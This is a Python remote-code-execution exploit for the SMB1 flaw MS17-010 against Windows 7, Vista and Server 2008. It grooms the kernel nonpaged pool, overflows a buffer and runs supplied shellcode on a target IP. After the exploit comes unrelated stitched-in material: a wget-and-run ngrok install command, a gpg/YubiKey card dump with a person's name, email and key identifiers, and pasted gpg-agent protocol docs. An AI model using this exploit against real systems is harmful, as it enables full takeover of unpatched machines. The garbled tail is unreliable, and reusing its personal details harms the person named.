# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += '\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa


fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the value of feaList size MUST be >=0x10000 to trigger bug (but must be less than data size)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)


# fake struct for SrvNetWskReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00010
#   offset 0xa0:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x08:  set to 3 (DWORD) for invoking ptr to function
#   offset 0x1d0: KSPIN_LOCK
#   offset 0x1d8: array of pointer to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)


def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


def createSessionAllocNonPaged(target, size):
	# There is a bug in SMB_COM_SESSION_SETUP_ANDX command that allow us to allocate a big nonpaged pool.
	# The big nonpaged pool allocation is in BlockingSessionSetupAndX() function for storing NativeOS and NativeLanMan.
	# The NativeOS and NativeLanMan size is caculated from "ByteCount - other_data_size"
	
	# Normally a server validate WordCount and ByteCount field in SrvValidateSmb() function. They must not be larger than received data. 
	# For "NT LM 0.12" dialect, There are 2 possible packet format for SMB_COM_SESSION_SETUP_ANDX command.
	# - https://msdn.microsoft.com/en-us/library/ee441849.aspx for LM and NTLM authentication
	#   - GetNtSecurityParameters() function is resposible for extracting data from this packet format
	# - https://msdn.microsoft.com/en-us/library/cc246328.aspx for NTLMv2 (NTLM SSP) authentication
	#   - GetExtendSecurityParameters() function is resposible for extracting data from this packet format
	
	# These 2 formats have different WordCount (first one is 13 and later is 12). 
	# Here is logic in BlockingSessionSetupAndX() related to this bug
	# - check WordCount for both formats (the CAP_EXTENDED_SECURITY must be set for extended security format)
	# - if FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY are set, process a message as Extend Security request
	# - else, process a message as NT Security request
	
	# So we can send one format but server processes it as another format by controlling FLAGS2_EXTENDED_SECURITY and CAP_EXTENDED_SECURITY.
	# With this confusion, server read a ByteCount from wrong offset to calculating "NativeOS and NativeLanMan size".
	# But GetExtendSecurityParameters() checks ByteCount value again.
	
	# So the only possible request to use the bug is sending Extended Security request but does not set FLAGS2_EXTENDED_SECURITY.
	
	conn = smb.SMB(target, target)
	_, flags2 = conn.get_flags()
	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

	sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
	sessionSetup['Parameters']['SessionKey']         = 0
	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
	# UnicodePasswordLen field is in Reserved for extended security format. 0 for NULL session
	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY  # can add other flags

	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
	return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	# Here is another bug in MS17-010.
	# To call transaction subcommand, normally a client need to use correct SMB commands as documented in
	#   https://msdn.microsoft.com/en-us/library/ee441514.aspx
	# If a transaction message is larger than SMB message (MaxBufferSize in session parameter), a client 
	#   can use *_SECONDARY command to send transaction message. When sending a transaction completely with
	#   *_SECONDARY command, a server uses the last command that complete the transaction.
	# For example:
	# - if last command is SMB_COM_NT_TRANSACT_SECONDARY, a server executes subcommand as NT_TRANSACT_*.
	# - if last command is SMB_COM_TRANSACTION2_SECONDARY, a server executes subcommand as TRANS2_*.
	#
	# Without MS17-010 patch, a client can mix a transaction command if TID, PID, UID, MID are the same.
	# For example:
	# - a client start transaction with SMB_COM_NT_TRANSACT command
	# - a client send more transaction data with SMB_COM_NT_TRANSACT_SECONDARY and SMB_COM_TRANSACTION2_SECONDARY
	# - a client sned last transactino data with SMB_COM_TRANSACTION2_SECONDARY
	# - a server executes transaction subcommand as TRANS2_* (first 2 bytes of Setup field)
	
	# From https://msdn.microsoft.com/en-us/library/ee442192.aspx, a maximum data size for sending a transaction 
	#   with SMB_COM_TRANSACTION2 is 65535 because TotalDataCount field is USHORT
	# While a maximum data size for sending a transaction with SMB_COM_NT_TRANSACT is >65536 because TotalDataCount
	#   field is ULONG (see https://msdn.microsoft.com/en-us/library/ee441534.aspx).
	# Note: a server limit SetupCount+TotalParameterCount+TotalDataCount to 0x10400 (in SrvAllocationTransaction)
	
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)
	
	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB() # must be success
	
	# Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
	i = firstDataFragmentSize
	while i < len(data):
		# limit data to 4096 bytes per SMB message because this size can be used for all Windows version
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i

	
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
def createConnectionWithBigSMBFirst80(target):
	# https://msdn.microsoft.com/en-us/library/cc246496.aspx
	# Above link is about SMB2, but the important here is first 4 bytes.
	# If using wireshark, you will see the StreamProtocolLength is NBSS length.
	# The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
	#
	# After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
	sk = socket.create_connection((target, 445))
	# For this exploit, use size is 0x11000
	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xfeSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


def exploit(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)

	# can use conn.login() for ntlmv2
	conn.login_standard('', '')
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if not (server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
		print('This exploit does not support this target')
		sys.exit()
	

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
	
	# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, 2000, False)
	# we have to know what size of NtFeaList will be created when last fragment is sent

	# make sure server recv all payload before starting allocate big NonPaged
	#sendEcho(conn, tid, 'a'*12)

	# create buffer size NTFEA_SIZE-0x1000 at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
		
	# send echo again, all new 5 srvnet buffers should be created
	#sendEcho(conn, tid, 'a'*12)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()

	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
		

	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode by closing srvnet connection
	for sk in srvnetConn:
		sk.close()

	# nicely close connection (no need for exploit)
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()


if len(sys.argv) < 3:
	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
	sys.exit(1)

TARGET=sys.argv[1]
numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])

fp = open(sys.argv[2], 'rb')
sc = fp.read()
fp.close()

print('shellcode size: {:d}'.format(len(sc)))
print('numGroomConn: {:d}'.format(numGroomConn))

exploit(TARGET, sc, numGroomConn)
print('done')

https://github.com/6309304695/OVERSEER-GRATEFUL345I.git
              #000006 $ Breadcrumbs X 4
wget --no-check-certificate https://github.com/clangcn/ngrok-one-key-install/raw/master/install_ngrok.sh -O ./install_ngrok.sh
chmod 500 ./install_ngrok.sh
./install_ngrok.sh install	
服务器管理
 gpg/card> writecert PIV.9C < sign.crt
+# MS17-010
+# 000006
+Reader ...........: 1050:0407:X:0
+Card type ........: yubikey
+Card firmware ....: 5.1.2
+Serial number ....: FF020001008A77C1
+Application type .: PIV
+Version ..........: 1.0
+Displayed s/n ....: yk-9074625
+PIN usage policy .: app-pin
+PIN retry counter : - [verified] -
+PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
+      keyref .....: PIV.9A  (auth)
+      algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
+      keyref .....: PIV.9E  (auth)
+      algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
+      keyref .....: PIV.9C  (sign,cert)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.co
+ m>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
+      keyref .....: PIV.9D  (encr)
+      algorithm ..: rsa2048
+      used for ...: X.509
+        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
+        user id ..: <6309304695z@gmail.com>
+ PIV authentication’ key with ssh:
+
+$ ssh-add -l
+384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
+ssh-add with the uppercase ‘-L
+$ gpgsm --learn
+$ gpg --full-gen-key
+Please select what kind of key you want:
+   (1) RSA and RSA (default)
+   (2) DSA and Elgamal
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 3
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+
+GnuPG needs to construct a user ID to identify your key.
+
+Real name: keith bieszczat
+Email address: 6309304695z@gmail.com
+Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
+You selected this USER-ID:
+    "6309304695z@gmail.com"
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
+gpg: key C3AFA9ED971BB365 marked as ultimately trusted
+gpg: revocation certificate stored as '[...]D971BB365.rev'
+public and secret key created and signed.
+
+Note that this key cannot be used for encryption.  You may want to use
+the command "--edit-key" to generate a subkey for this purpose.
+pub   rsa2048 2019-04-04 [SC]
+      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid                      6309304695z@gmail.com
+
+ run gpg in --expert mode
+ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+Secret key is available.
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net
+gpg> addkey
+Secret parts of primary key are stored on-card.
+Please select what kind of key you want:
+   (3) DSA (sign only)
+   (4) RSA (sign only)
+   (5) Elgamal (encrypt only)
+   (6) RSA (encrypt only)
+  (14) Existing key from card
+Your selection? 14
+Serial number of the card: FF020001008A77C1
+Available keys:
+   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
+   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
+   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
+   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
+Your selection? 4
+Please specify how long the key should be valid.
+         0 = key does not expire
+      <n>  = key expires in n days
+      <n>w = key expires in n weeks
+      <n>m = key expires in n months
+      <n>y = key expires in n years
+Key is valid for? (0)
+Key does not expire at all
+Is this correct? (y/N) y
+Really create? (y/N) y
+
+sec  rsa2048/C3AFA9ED971BB365
+     created: 2019-04-04  expires: never       usage: SC
+     card-no: FF020001008A77C1
+     trust: ultimate      validity: ultimate
+ssb  rsa2048/7067860A98FCE6E1
+     created: 2019-04-04  expires: never       usage: E
+     card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net
+
+gpg> save
+ 
+/* 32A19-D90712   
+LEVEL-5 CLEARANCE ONLY
+ ‘--force’
+authentication key 
+-header-'010203040506070801020304050607080102030405060708'
+SETDATA hexstring
+to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
+
+  PKSIGN keyid
+where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
+
+  PKSIGN --hash=algoname keyid
+READKEY hexified_certid
+READCERT hexified_certid|keyid
+SERIALNO
+Return the serial number of the card using a status response like:
+
+  S SERIALNO D27600000000000000000000
+ WRITEKEY [--force] keyid
+SETDATA hexstring
+to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
+
+  PKDECRYPT keyid
+CHECKPIN idstr
+RESTART
+APDU [--atr] [--more] [--exlen[=n]] [hexstring]
+S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+
+./configure --sysconfdir=/etc --localstatedir=/va
+CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
+  A6935DD34EF3087973C706FC311AA2CCF733765B S
+
+  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
+  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
+
+  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
+  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
+  
+       # Key added on: 2011-07-20 20:38:46
+       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
+       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/
+gpg-connect-agent 'help COMMAND' /bye
+SETKEY <keyGrip>
+Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
+
+  PKDECRYPT
+The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
+
+    S: INQUIRE CIPHERTEXT
+    C: D (xxxxxx
+    C: D xxxx)
+    C: END
+Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
+
+     (enc-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
+
+If the decryption was successful the decrypted data is returned by means of "D" lines.
+
+Here is an example session:
+
+   C: PKDECRYPT
+   S: INQUIRE CIPHERTEXT
+   C: D (enc-val elg (a 349324324)
+   C: D    (b 3F444677CA)))
+   C: END
+   S: # session key follows
+   S: S PADDING 0
+   S: D (value 1234567890ABCDEF0)
+   S: OK decryption successful
+The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
+SIGKEY <keyGrip>
+This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
+
+   SETHASH --hash=<name>|<algo> <hexstring>
+sig-val
+       (<algo>
+         (<param_name1> <mpi>)
+     ...
+         (<param_namen> <mpi>)))
+The operation is affected by the option
+
+   OPTION use-cache-for-signing=0|1
+The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+
+Here is an example session:
+
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: SIGKEY <keyGrip>
+   S: OK key available
+   C: PKSIGN
+   S: # I did ask the user whether he really wants to sign
+   S: # I did ask the user for the passphrase
+   S: INQUIRE HASHVAL
+   C: D ABCDEF012345678901234
+   C: END
+   S: # signature follows
+   S: D (sig-val rsa (s 45435453654612121212))
+   S: OK
+  GENKEY [--no-protection] [--preset] [<cache_nonce>]
+Invokes the key generation process and the server will then inquire on the generation parameters, like:
+
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+The format of the key parameters which depends on the algorithm is of the form:
+
+    (genkey
+      (algo
+        (parameter_name_1 ....)
+          ....
+        (parameter_name_n ....)))
+If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
+
+     (public-key
+       (rsa
+   (n <mpi>)
+   (e <mpi>)))
+Here is an example session:
+
+   C: GENKEY
+   S: INQUIRE KEYPARM
+   C: D (genkey (rsa (nbits  1024)))
+   C: END
+   S: D (public-key
+   S: D   (rsa (n 326487324683264) (e 10001)))
+   S  OK key created
+    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
+LISTTRUSTED
+GpgAgent returns a list of trusted keys line by line:
+
+    S: D 000000001234454556565656677878AF2F1ECCFF P
+    S: D 340387563485634856435645634856438576457A P
+    S: D FEDC6532453745367FD83474357495743757435D S
+    S: OK
+The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
+Ok
+Finally a client should be able to mark a key as trusted:
+
+   MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+   S: INQUIRE TRUSTDESC
+   C: D Do you trust the key with the fingerprint @FPR@
+   C: D bla fasel blurb.
+   C: END
+   S: OK
+GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
+                 [--qualitybar] cache_id                \
+                 [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
+
+HAVEKEY keygrips
+  GET_CONFIRMATION description
+  LEARN [--send]
+UPDATESTARTUPTTY
+SETDATA hexstring
+
+
+  PKSIGN keyid
+
+
